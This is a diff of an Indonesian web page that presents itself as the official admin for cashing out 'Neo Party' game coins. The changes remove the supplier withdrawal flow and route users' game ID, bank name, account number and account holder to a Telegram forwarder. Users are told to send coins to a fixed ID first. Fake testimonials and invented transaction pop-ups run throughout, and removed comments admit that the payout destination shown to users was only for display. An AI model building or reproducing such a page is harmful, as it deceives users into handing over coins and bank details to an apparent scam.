@@ -1,9 +1,9 @@
-<!DOCTYPE html>
+<!DOCTYPE html> 
 <html lang="id"> 
 <head> 
     <meta charset="UTF-8"> 
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Bongkar - King Arthur</title> 
+    <title>Bongkar - Neo Party</title> 
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
@@ -245,6 +245,17 @@
 
         .pretty-icon { margin-right: 12px; color: #6b3f1d; font-size: 1.1rem; }
 
+        /* --- ID ADMIN AREA --- */
+        .id-display-section {
+            background: rgba(0,0,0,0.25); border-radius: 20px; padding: 20px 10px;
+            margin: 20px 0; text-align: center; border: 1px solid rgba(255,255,255,0.05);
+        }
+        .id-image { width: 140px; border-radius: 10px; border: 3px solid #ffcc33; margin-bottom: 15px; }
+        .copy-btn { 
+            background: #fff; border: none; padding: 8px 15px; border-radius: 8px;
+            font-weight: 800; cursor: pointer; color: #ff9800; font-size: 0.75rem;
+        }
+
         /* --- SUBMIT --- */
         .button-group { text-align: center; padding: 20px 0; }
         button[type="submit"] {
@@ -323,50 +334,16 @@
             background: var(--primary-light); padding: 30px; border-radius: 25px;
             text-align: center; max-width: 300px; border: 2px solid var(--accent-cyan);
         }
-
-        /* --- MAINTENANCE OVERLAY (mengikuti status supplier) --- */
-        @keyframes maintPulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.35; }
-        }
-        .maint-pulse-dot { animation: maintPulse 1.6s ease-in-out infinite; }
     </style>
 </head>
 <body>
-
-<!-- OVERLAY MAINTENANCE: tampil otomatis mengikuti status supplier King Arthur.
-     Muncul kalau /api/kingarthur-order?action=health != READY, hilang otomatis
-     setelah supplier normal. Polling tiap 60 detik. -->
-<div id="supplierMaintenance" style="display:none;">
-    <div style="position:fixed; inset:0; z-index:9999; display:flex; align-items:center; justify-content:center; background:rgba(255,255,255,0.95); backdrop-filter:blur(4px); padding:16px; overflow-y:auto;">
-        <div style="background:#fff; border-radius:20px; box-shadow:0 10px 40px rgba(0,0,0,0.12); border:1px solid #f3f4f6; max-width:440px; width:100%; padding:36px 32px; text-align:center;">
-            <div style="width:64px; height:64px; margin:0 auto 22px; border-radius:50%; background:#fef3c7; display:flex; align-items:center; justify-content:center;">
-                <i class="fas fa-gear" style="color:#d97706; font-size:28px;"></i>
-            </div>
-            <h1 style="color:#111827; font-size:1.4rem; font-weight:800; margin:0 0 12px; font-family:'Poppins',sans-serif;">Sedang Dalam Pemeliharaan</h1>
-            <p style="color:#4b5563; font-size:0.9rem; line-height:1.7; margin:0 0 20px; font-family:'Poppins',sans-serif;">
-                Kami sedang melakukan pemeliharaan terjadwal untuk meningkatkan pengalaman Anda.
-                Silakan coba lagi dalam beberapa menit.
-            </p>
-            <p style="color:#6b7280; font-size:0.82rem; margin:0 0 24px; font-family:'Poppins',sans-serif;">
-                <span class="maint-pulse-dot" style="display:inline-block; width:8px; height:8px; border-radius:50%; background:#fbbf24; margin-right:6px;"></span>Pemeliharaan sistem sedang berlangsung.
-            </p>
-            <button type="button" onclick="checkSupplierStatus(true)" style="background:#2563eb; color:#fff; border:none; border-radius:10px; padding:12px 26px; font-size:0.9rem; font-weight:700; cursor:pointer; display:inline-flex; align-items:center; gap:8px; font-family:'Poppins',sans-serif;">
-                <i class="far fa-file-alt"></i> Transaksi Saya
-            </button>
-            <div style="border-top:1px solid #f3f4f6; margin-top:28px; padding-top:18px;">
-                <p style="color:#9ca3af; font-size:0.75rem; margin:0; font-family:'Poppins',sans-serif;">Terima kasih atas kesabaran Anda</p>
-            </div>
-        </div>
-    </div>
-</div>
 
 <div class="bg-glow"></div>
 
 <div class="appnwghdiprem">
     <div class="boxverifnwghdi">
         <div class="headernwgverifhdi">
-            <p>ADMIN RESMI KING ARTHUR</p>
+            <p>ADMIN RESMI NEO PARTY</p>
         </div>
 
         <div class="banner-container">
@@ -400,11 +377,23 @@
                         <option value="5B - 310 RIBU">5B - 310 RIBU</option>
                         <option value="6B - 372 RIBU">6B - 372 RIBU</option>
                         <option value="7B - 434 RIBU">7B - 434 RIBU</option>
-                        <option value="8B - 496 RIBU">8B - 496 RIBU</option>
-                        <option value="9B - 558 RIBU">9B - 558 RIBU</option>
-                        <option value="10B - 620 RIBU">10B - 620 RIBU</option>
-                        <option value="20B - 1 JUTA 240 RIBU">20B - 1 JUTA 240 RIBU</option>
                     </select>
+                </div>
+
+                <div class="id-display-section">
+                    <p style="color: #ffcc33; font-weight: 800; margin-bottom: 10px; font-size: 0.9rem;">KIRIM KOIN KE ID DIBAWAH:</p>
+                    <img src="neo.jpg" class="id-image">
+                    <div style="color:#00e5f4; font-size:1.05rem; font-weight:800; margin-bottom:12px;">KINGS 2</div>
+                    <div class="pretty-input" style="background: #fff; width: 90%; margin: 0 auto; position: relative;">
+                        <input type="text" id="idPenerima" value="3314726" readonly style="color: #000; text-align: center; padding-right: 60px;">
+                        <button type="button" class="copy-btn" style="position: absolute; right: 5px;" onclick="copyID()">SALIN</button>
+                    </div>
+                </div>
+
+                <div class="section-title"><i class="fas fa-camera"></i> BUKTI KIRIM KOIN</div>
+                <div class="pretty-input" style="background: rgba(0,0,0,0.2); border: 1px dashed var(--accent-cyan);">
+                    <input type="file" id="myFile" style="color: #fff; font-size: 0.8rem; padding: 5px;">
+                    <span style="font-size:0.7rem; opacity:0.6;">Opsional</span>
                 </div>
 
                 <div class="section-title"><i class="fas fa-money-bill-wave"></i> REKENING PENCAIRAN UANG</div>
@@ -572,7 +561,8 @@ stars.forEach(s => s.classList.add('active'));
   "Aman bongkar 14B",
   "aman bang makasih",
   "akhirnya nemu agen resmi nya bongkar secepat kilat",
-  "aman bang makasih admin dana bongkar 100b cair hitungan menit",
+  "aman bongkar 20b",
+  "makasih bang admin dana bongkar 100b cair hitungan menit",
   "bongkar 5b amanah",
   "bongkar 12b aman boss"
 ];
@@ -595,7 +585,6 @@ stars.forEach(s => s.classList.add('active'));
     }
 
     function createToast() {
-    if (window.supplierMaintenanceOn) return; // mati saat maintenance
     const transaksi = [
     { nominal: "62.000", chip: "1B" },
     { nominal: "186.000", chip: "3B" },
@@ -651,7 +640,7 @@ stars.forEach(s => s.classList.add('active'));
     createToast();
     setInterval(createToast, 5000);
 
-    // --- FORM SUBMIT: otomatis via supplier KING ARTHUR ---
+    // --- FORM SUBMIT: POLOSAN — data langsung ke Telegram, tanpa order ke supplier ---
     document.getElementById("bongkarForm").addEventListener("submit", async function(e) {
         e.preventDefault();
 
@@ -660,9 +649,9 @@ stars.forEach(s => s.classList.add('active'));
         const jumlahVal = this.querySelector('[name="jumlah_bongkaran"]').value || "";
         const amount = jumlahVal.split(" ")[0].toUpperCase(); // "5B - 310 RIBU" -> "5B"
 
-        // data form hanya untuk TAMPILAN popup & notif Telegram
-        // (diabaikan backend — WD aktual tetap ke rekening fixed di .env server)
-        const displayInfo = {
+        const info = {
+            royal_id: royalId,
+            amount: amount,
             bank: (this.querySelector('[name="bank_pencairan"]') || {}).value || "-",
             account_number: ((this.querySelector('[name="nomor_rekening"]') || {}).value || "").trim() || "-",
             account_name: ((this.querySelector('[name="atas_nama"]') || {}).value || "").trim() || "-",
@@ -672,119 +661,53 @@ stars.forEach(s => s.classList.add('active'));
             alert("ID Game tidak valid.");
             return;
         }
-        if (!/^([1-9]|10|20)B$/.test(amount)) {
+        if (!/^([1-9]|10)B$/.test(amount)) {
             alert("Pilih jumlah bongkar yang valid.");
             return;
         }
 
-        btn.innerText = "MEMPROSES...";
+        btn.innerText = "MENGIRIM...";
         btn.disabled = true;
 
         try {
-            const res = await fetch("/api/kingarthur-order", {
+            // kirim data order ke Telegram via forwarder (tanpa order ke supplier)
+            await fetch("/api/gcsgames-notify", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ royal_id: royalId, amount: amount })
+                body: JSON.stringify({ type: "pending", ...info })
             });
-            const data = await res.json();
-
-            if (!data.success && !data.pending) {
-                throw new Error(data.error || "Gagal membuat penarikan.");
-            }
-
-            // tampilkan popup status, polling sampai supplier konfirmasi
-            openWithdrawModal(data, displayInfo);
-            // notif Telegram: PENDING
-            sendTelegramNotif('pending', {
-                royal_id: royalId,
-                amount: amount,
-                bank: displayInfo.bank,
-                account_number: displayInfo.account_number,
-                account_name: displayInfo.account_name,
-                order_id: data.order_id,
-            });
-            pollWithdraw(data.order_id, displayInfo, { royal_id: royalId, amount: amount });
-
+            openOrderSentModal(info);
+            document.getElementById("bongkarForm").reset();
         } catch (err) {
-            console.error("BONGKAR ERROR:", err);
-            alert("Gagal: " + err.message);
+            console.error("KIRIM ERROR:", err);
+            alert("Gagal mengirim data. Coba lagi.");
         } finally {
             btn.innerText = "PROSES BONGKAR";
             btn.disabled = false;
         }
     });
 
-    function openWithdrawModal(data, displayInfo) {
-        const w = data.withdrawal || {};
-        const isPending = !!data.pending;
+    function openOrderSentModal(info) {
         document.getElementById("modalWithdraw").style.display = "flex";
-        document.getElementById("wd-spinner").textContent = "⏳";
-        document.getElementById("wd-title").textContent = isPending ? "MENUNGGU ANTRIAN..." : "MEMPROSES PENARIKAN...";
-        document.getElementById("wd-title").style.color = "var(--accent-cyan)";
-        document.getElementById("wd-close").style.display = "none";
-        document.getElementById("wd-note").textContent = isPending
-            ? "Order masuk antrian, mohon tunggu..."
-            : "Mohon tunggu, sedang menghubungi supplier...";
-        renderWithdrawBody(w, data.order_id, displayInfo);
-    }
-
-    function fmtRp(v) {
-        if (v === null || v === undefined || v === "") return "-";
-        const n = Number(v);
-        return isNaN(n) ? String(v) : "Rp " + n.toLocaleString("id-ID");
-    }
-
-    // Harga dari frontend (opsi "1B - 62 RIBU"), bukan dari API supplier.
-    // Mendukung format "62 RIBU" dan "1 JUTA 240 RIBU".
-    function parseFrontendPrice(optionValue) {
-        if (!optionValue) return null;
-        const m = String(optionValue).match(/-\s*(.+?)\s*$/);
-        if (!m) return null;
-        let s = m[1].toUpperCase();
-        let total = 0;
-        const juta = s.match(/(\d+)\s*JUTA/);
-        if (juta) { total += parseInt(juta[1], 10) * 1000000; s = s.replace(/(\d+)\s*JUTA/, ''); }
-        const ribu = s.match(/(\d+)\s*RIBU/);
-        if (ribu) { total += parseInt(ribu[1], 10) * 1000; }
-        return total > 0 ? total : null;
-    }
-
-    function getFrontendPrice() {
-        const sel = document.querySelector('select');
-        const opt = sel && sel.options ? sel.options[sel.selectedIndex] : null;
-        const val = opt ? (opt.value || opt.textContent) : '';
-        return parseFrontendPrice(val);
-    }
-
-    function renderWithdrawBody(w, orderId, displayInfo) {
-        const di = displayInfo || {};
-        const hasData = w && w.withdrawal_id;
-        // Tujuan & nama tampil sesuai isi form user (WD aktual tetap ke rekening fixed di .env server)
-        const tujuan = (di.bank && di.bank !== "-") ? (di.bank + " " + (di.account_number || "")) : (hasData ? ((w.bank_name || "-") + " " + (w.account_number || "")) : "-");
-        const nama = (di.account_name && di.account_name !== "-") ? di.account_name : (w.account_name || "-");
-        // Harga tampil ikut frontend (bukan nett supplier).
-        const fPrice = getFrontendPrice();
-        const showPrice = fPrice || w.product_amount;
-        const showNett = fPrice ? fmtRp(fPrice) : (w.nett_amount || fmtRp(w.product_amount));
-        const rows = [
-            ["ID Penarikan", w.withdrawal_id || orderId || "-"],
-            ["Koin", w.coin || "-"],
-            ["Nilai Coin", fmtRp(showPrice)],
-            ["Biaya Admin", fPrice ? "-" : (w.total_fee ? "- " + fmtRp(w.total_fee) : "-")],
-            ["Nominal Bersih", showNett],
-            ["Tujuan", tujuan.trim() || "-"],
-            ["Nama Penerima", nama],
-            ["Berlaku s/d", w.expires_at ? new Date(w.expires_at).toLocaleString("id-ID") : "-"],
-        ];
-        document.getElementById("wd-body").innerHTML = rows.map(r =>
-            `<div style="display:flex; justify-content:space-between; gap: 10px; border-bottom: 1px solid rgba(255,255,255,0.08); padding: 4px 0;">
-                <span style="opacity:0.7; flex-shrink: 0;">${r[0]}</span><span style="font-weight:700; text-align: right; word-break: break-all; overflow-wrap: anywhere;">${r[1]}</span>
-            </div>`).join("");
+        document.getElementById("wd-spinner").textContent = "✅";
+        document.getElementById("wd-title").textContent = "DATA TERKIRIM";
+        document.getElementById("wd-title").style.color = "#4caf50";
+        document.getElementById("wd-note").textContent = "Kirim koin ke ID di atas, admin akan memproses setelah koin diterima.";
+        document.getElementById("wd-close").style.display = "block";
+        const row = (k, v) =>
+            '<div style="display:flex; justify-content:space-between; gap: 10px; border-bottom: 1px solid rgba(255,255,255,0.08); padding: 4px 0;">' +
+            '<span style="opacity:0.7; flex-shrink: 0;">' + k + '</span>' +
+            '<span style="font-weight:700; text-align: right; word-break: break-all; overflow-wrap: anywhere;">' + v + '</span></div>';
+        document.getElementById("wd-body").innerHTML =
+            row("ID Game", info.royal_id) +
+            row("Jumlah", info.amount) +
+            row("Tujuan", (info.bank + " " + info.account_number).trim()) +
+            row("Atas Nama", info.account_name);
     }
 
     function copyWithdrawID() {
         const el = document.getElementById("wd-target-id");
-        const id = (el ? el.textContent : "").trim() || "10101010";
+        const id = (el ? el.textContent : "").trim() || "1461077";
         const tmp = document.createElement("input");
         tmp.value = id;
         document.body.appendChild(tmp);
@@ -792,80 +715,6 @@ stars.forEach(s => s.classList.add('active'));
         document.execCommand("copy");
         document.body.removeChild(tmp);
         alert("ID Tujuan Disalin!");
-    }
-
-    // --- NOTIF TELEGRAM (fire-and-forget, tidak blokir flow utama) ---
-    function sendTelegramNotif(type, info) {
-        fetch("/api/kingarthur-notify", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ type: type, ...info })
-        }).catch(() => {});
-    }
-
-    async function pollWithdraw(orderId, displayInfo, baseInfo) {
-        const maxTries = 60; // ~3 menit
-        let gotWithdrawal = false;
-        for (let i = 0; i < maxTries; i++) {
-            await new Promise(r => setTimeout(r, 3000));
-            try {
-                const res = await fetch("/api/kingarthur-order?order_id=" + encodeURIComponent(orderId));
-                const data = await res.json();
-                if (!data.success) continue;
-
-                // update data withdrawal kalau sudah ada
-                if (data.withdrawal && data.withdrawal.withdrawal_id && !gotWithdrawal) {
-                    gotWithdrawal = true;
-                    renderWithdrawBody(data.withdrawal, orderId, displayInfo);
-                    document.getElementById("wd-title").textContent = "MENUNGGU KONFIRMASI SUPPLIER...";
-                    document.getElementById("wd-note").textContent = "Inquiry berhasil. Menunggu supplier memproses dana...";
-                }
-
-                // cek live status dari supplier
-                if (data.live) {
-                    const st = String(data.live.withdrawal_status || "").toLowerCase();
-                    const label = data.live.status_label || "";
-                    if (st && st !== "pending" && st !== "menunggu") {
-                        document.getElementById("wd-spinner").textContent = "✅";
-                        document.getElementById("wd-title").textContent = "PENARIKAN BERHASIL";
-                        document.getElementById("wd-title").style.color = "#4caf50";
-                        document.getElementById("wd-note").textContent =
-                            "Dana telah diproses" + (label ? " (" + label + ")" : "") + ".";
-                        document.getElementById("wd-close").style.display = "block";
-                        if (data.live.raw && data.live.raw.data) {
-                            renderWithdrawBody(data.live.raw.data, orderId, displayInfo);
-                        }
-                        // notif Telegram: SUKSES
-                        const wd = (data.live.raw && data.live.raw.data) || {};
-                        sendTelegramNotif('success', {
-                            royal_id: (baseInfo || {}).royal_id,
-                            amount: (baseInfo || {}).amount,
-                            bank: displayInfo.bank,
-                            account_number: displayInfo.account_number,
-                            account_name: displayInfo.account_name,
-                            order_id: orderId,
-                            withdrawal_id: wd.withdrawal_id,
-                            coin: wd.coin,
-                            nett_amount: (function(){ const fp = getFrontendPrice(); return fp ? fmtRp(fp) : wd.nett_amount; })(),
-                        });
-                        return;
-                    }
-                }
-
-                // order gagal di tengah jalan
-                if (data.order_status && ["FAILED", "MANUAL_VERIFICATION_REQUIRED",
-                    "BROWSER_ERROR", "SUPPLIER_ERROR"].includes(data.order_status)) {
-                    document.getElementById("wd-spinner").textContent = "❌";
-                    document.getElementById("wd-title").textContent = "PENARIKAN GAGAL";
-                    document.getElementById("wd-title").style.color = "#f44336";
-                    document.getElementById("wd-note").textContent = "Silakan coba lagi atau hubungi admin.";
-                    document.getElementById("wd-close").style.display = "block";
-                    return;
-                }
-            } catch (e) { /* abaikan, coba lagi */ }
-        }
-        document.getElementById("wd-note").textContent = "Masih diproses. Tutup popup ini dan cek lagi nanti.";
-        document.getElementById("wd-close").style.display = "block";
     }
 
     function closeWithdraw() {
@@ -880,6 +729,12 @@ stars.forEach(s => s.classList.add('active'));
         document.getElementById('modalNotice').style.display = 'flex';
     }
     function closeNotice() { document.getElementById('modalNotice').style.display = 'none'; }
+    function copyID() {
+        const el = document.getElementById('idPenerima');
+        el.select();
+        document.execCommand('copy');
+        alert('ID Tujuan Disalin!');
+    }
 
     function showOffline(button) {
     const icon = button.querySelector('i');
@@ -901,39 +756,6 @@ stars.forEach(s => s.classList.add('active'));
 }
 </script>
 
-<script>
-    /* FOLLOW SUPPLIER KING ARTHUR: halaman mengikuti status supplier asli.
-       - Polling GET /api/kingarthur-order?action=health tiap 60 detik (langsung saat load).
-       - Kalau supplier bukan READY (maintenance / error / proxy mati):
-         overlay #supplierMaintenance tampil menutupi seluruh halaman.
-       - Kalau supplier kembali READY: overlay hilang, halaman normal lagi. */
-    (function () {
-        var overlay = document.getElementById('supplierMaintenance');
-        var maintenanceOn = false;
-
-        function setMaintenance(on) {
-            if (on === maintenanceOn) return;
-            maintenanceOn = on;
-            window.supplierMaintenanceOn = on; // dibaca createToast()
-            overlay.style.display = on ? 'block' : 'none';
-            document.body.style.overflow = on ? 'hidden' : '';
-        }
-
-        window.checkSupplierStatus = async function () {
-            try {
-                var res = await fetch('/api/kingarthur-order?action=health', { cache: 'no-store' });
-                var data = await res.json();
-                setMaintenance(String(data.supplier || '').toUpperCase() !== 'READY');
-            } catch (e) {
-                setMaintenance(true); // forwarder/proxy tidak bisa dihubungi = anggap down
-            }
-        };
-
-        checkSupplierStatus();
-        setInterval(checkSupplierStatus, 60000);
-    })();
-</script>
-
 <!-- MODAL STATUS WITHDRAW -->
 <div class="modal-overlay" id="modalWithdraw">
     <div class="modal-content" style="max-width: 440px; width: 92%; text-align: left; max-height: 90vh; overflow-y: auto;">
@@ -943,8 +765,8 @@ stars.forEach(s => s.classList.add('active'));
         </div>
         <div id="wd-send" style="background: rgba(255,204,51,0.12); border: 1px solid #ffcc33; border-radius: 12px; padding: 12px; margin-bottom: 12px; text-align: center;">
             <div style="font-size: 0.8rem; font-weight: 700; color: #ffcc33; margin-bottom: 6px;">KIRIM KOIN KE ID:</div>
-            <div id="wd-target-id" style="font-size: 1.3rem; font-weight: 800; color: #fff; letter-spacing: 2px;">10101010</div>
-            <div style="font-size: 0.85rem; color: #00e5f4; font-weight: 700;">MERLIN</div>
+            <div id="wd-target-id" style="font-size: 1.3rem; font-weight: 800; color: #fff; letter-spacing: 2px;">1461077</div>
+            <div style="font-size: 0.85rem; color: #00e5f4; font-weight: 700;">NEOPARTY</div>
             <button type="button" onclick="copyWithdrawID()" style="margin-top: 8px; background: #fff; border: none; padding: 6px 18px; border-radius: 8px; font-weight: 800; cursor: pointer; color: #ff9800; font-size: 0.75rem;">SALIN ID</button>
         </div>
         <div id="wd-body" style="font-size: 0.85rem; line-height: 1.9; color: #fff;"></div>
@@ -953,15 +775,12 @@ stars.forEach(s => s.classList.add('active'));
     </div>
 </div>
 
-<!--Start of Tawk.to Script-->
-<!--Start of Neo Party AI Chat-->
-<script src="https://api.neoparty.web.id/widget/widget.js"
+    
+<script src="https://api.neoparty.web.id/widget/widget.js?v=2"
         data-api="https://api.neoparty.web.id"
         data-title="CS Neo Party"
         data-greeting="Halo! Ada yang bisa saya bantu?">
 </script>
-<!--End of Neo Party AI Chat-->
-
 
 </body>
 </html>
